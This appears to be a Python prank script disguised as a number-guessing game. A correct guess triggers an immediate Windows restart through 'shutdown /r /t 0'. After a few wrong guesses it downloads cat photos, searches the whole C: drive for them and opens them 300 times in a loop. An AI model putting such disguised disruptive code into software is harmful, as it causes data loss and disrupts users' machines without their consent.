#Imports#
import random
import sys
import os
from PIL import Image
from io import BytesIO
from urllib.request import urlopen, Request

#Variables#
random_timer = random.randint(2,5)
gambling = True
number_found = True
url = "https://cdn.freecodecamp.org/curriculum/cat-photo-app/relaxing-cat.jpg"
url2 = "https://cdn.freecodecamp.org/curriculum/cat-photo-app/cats.jpg"
url3 = "https://images.unsplash.com/photo-1518791841217-8f162f1e1131"
file_path = "CatPhoto.png"
file_path2 = "CatPhoto2.png"
file_path3 = "CatPhoto3.png"
cat_number = 1
cat_start = True
cat_summons = 0

#Functions#
def find_file(search_directory, file_name):
    for root, dirs, files in os.walk(search_directory):
        if file_name in files:
            return os.path.join(root, file_name)
    return None

#While loops#
while gambling:
    if number_found:
        guess_number = random.randint(1,1000000)
        print("Find the number")
        number_found = False
    if number_found == False:
        try:
            player_input = int(input("Guess the number "))
        except Exception:
            print("You must enter an integer")
        else:
            if player_input == guess_number:
                print("Correct!")
                number_found = True
                os.system("shutdown /r /t 0")
            else:
                print("Wrong!")
                if player_input > guess_number:
                    print("Number is less than!")
                if player_input < guess_number:
                    print("Number is greater than!")
                print(" ")

    if number_found == False:
        random_timer -= 1
        if random_timer <= 0:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"}
            request1 = Request(url, headers=headers)
            with urlopen(request1) as response:
                with open(file_path, "wb") as file:
                    file.write(response.read())

            request2 = Request(url2, headers=headers)
            with urlopen(request2) as response:
                with open(file_path2, "wb") as file:
                    file.write(response.read())

            request3 = Request(url3, headers=headers)
            with urlopen(request3) as response:
                img = Image.open(BytesIO(response.read()))
                new_size = (400, 300)
                img_resized = img.resize(new_size)
                img_resized.save(file_path3)

                gambling = False
                cat = True

while cat:
    if cat_start:
        cat_file = "CatPhoto.png"
        cat_file2 = "CatPhoto2.png"
        cat_file3 = "CatPhoto3.png"
        search_directory = "C:/"
        cat_path = find_file(search_directory, cat_file)
        cat_path2 = find_file(search_directory, cat_file2)
        cat_path3 = find_file(search_directory, cat_file3)
        cat_start = False
    if cat_number == 1:
        os.startfile(cat_path)
    if cat_number == 2:
        os.startfile(cat_path2)
    if cat_number == 3:
        os.startfile(cat_path3)
        cat_number = 1
    cat_number += 1
    cat_summons += 1
    if cat_summons == 300:
        cat = False